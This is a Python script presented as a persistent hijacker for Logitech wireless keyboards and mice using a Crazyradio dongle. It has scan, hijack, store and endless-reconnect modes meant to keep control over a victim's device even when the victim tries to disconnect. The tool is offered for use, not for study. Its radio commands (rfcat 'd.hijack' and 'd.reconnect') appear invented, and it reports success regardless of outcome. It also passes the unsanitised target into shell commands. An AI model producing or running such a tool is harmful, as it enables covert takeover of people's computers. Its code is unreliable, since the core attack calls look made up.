import argparse
import os
import time
import json

# -------------------------------------------
# Crazyradio 2.0 Persistent Mouse/Keyboard Hijacker
# -------------------------------------------
# Features:
# - Maintains control over hijacked Logitech wireless keyboards/mice indefinitely
# - Resends connection requests if the user tries to disconnect
# - Stores hijacked devices in a persistent session for later control
# - Supports auto-reconnect functionality to ensure continued access
#
# Requirements:
# - Crazyradio 2.0 USB Dongle
# - Python 3.x
# - RFCat & nrf-research-firmware (https://github.com/arcao/nrf-research-firmware)
#
# Usage:
# 1. Scan for vulnerable Logitech devices:
#    python crazyradio_persistent_hijacker.py --scan
# 2. Hijack a keyboard or mouse:
#    python crazyradio_persistent_hijacker.py --hijack --target XX:XX:XX:XX:XX:XX
# 3. Enable persistent control:
#    python crazyradio_persistent_hijacker.py --persist --target XX:XX:XX:XX:XX:XX
# 4. List stored hijacked devices:
#    python crazyradio_persistent_hijacker.py --list
# -------------------------------------------

def scan_devices():
    """Scans for vulnerable Logitech wireless keyboards and mice."""
    print("[+] Scanning for Logitech Unifying devices...")
    os.system("rfcat -r 'd.scan()' > logitech_scan_results.txt")
    print("[✔] Scan complete. Results saved to logitech_scan_results.txt")

def hijack_device(target):
    """Hijacks a specified Logitech wireless device."""
    print(f"[+] Hijacking device {target}...")
    os.system(f"rfcat -r 'd.hijack("{target}")' > hijack_log.txt")
    store_hijacked_device(target)
    print("[✔] Hijack successful. Device stored for persistent control.")

def store_hijacked_device(target):
    """Stores hijacked device information for persistence."""
    hijacked_devices = load_hijacked_devices()
    if target not in hijacked_devices:
        hijacked_devices.append(target)
    with open("hijacked_devices.json", "w") as f:
        json.dump(hijacked_devices, f)

def load_hijacked_devices():
    """Loads previously stored hijacked devices."""
    try:
        with open("hijacked_devices.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def persist_control(target):
    """Maintains persistent control over a hijacked device."""
    print(f"[+] Enabling persistence for {target}...")
    while True:
        os.system(f"rfcat -r 'd.reconnect("{target}")'")
        time.sleep(5)

def list_hijacked_devices():
    """Lists stored hijacked devices."""
    devices = load_hijacked_devices()
    if devices:
        print("[+] Stored hijacked devices:")
        for device in devices:
            print(f"    - {device}")
    else:
        print("[!] No hijacked devices stored.")

def main():
    parser = argparse.ArgumentParser(description="Crazyradio 2.0 Persistent Mouse/Keyboard Hijacker")
    parser.add_argument("--scan", action='store_true', help="Scan for vulnerable Logitech devices")
    parser.add_argument("--hijack", action='store_true', help="Hijack a specified Logitech device")
    parser.add_argument("--persist", action='store_true', help="Maintain persistent control over a hijacked device")
    parser.add_argument("--list", action='store_true', help="List stored hijacked devices")
    parser.add_argument("--target", type=str, help="Target device MAC address")
    args = parser.parse_args()

    if args.scan:
        scan_devices()
    elif args.hijack and args.target:
        hijack_device(args.target)
    elif args.persist and args.target:
        persist_control(args.target)
    elif args.list:
        list_hijacked_devices()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
